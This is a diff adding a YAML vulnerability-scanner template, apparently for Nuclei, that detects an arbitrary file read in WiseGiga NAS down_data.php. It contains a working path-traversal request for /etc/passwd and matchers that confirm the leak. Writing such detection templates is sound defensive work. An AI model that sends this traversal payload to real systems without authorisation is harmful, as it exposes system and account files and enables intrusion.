@@ -1,0 +1,26 @@
+id: wisegiga-nas-down-data-php-any-file-read
+info:
+  name: WiseGiga NAS Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects arbitrary file read vulnerability in WiseGiga NAS down_data.php by attempting
+    to download sensitive files, such as /etc/passwd.
+http:
+  - method: GET
+    path:
+      - "/down_data.php?filename=../../../../../../../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/bin"
+          - "root:"
+      - type: word
+        words:
+          - "<"
+        negative: true
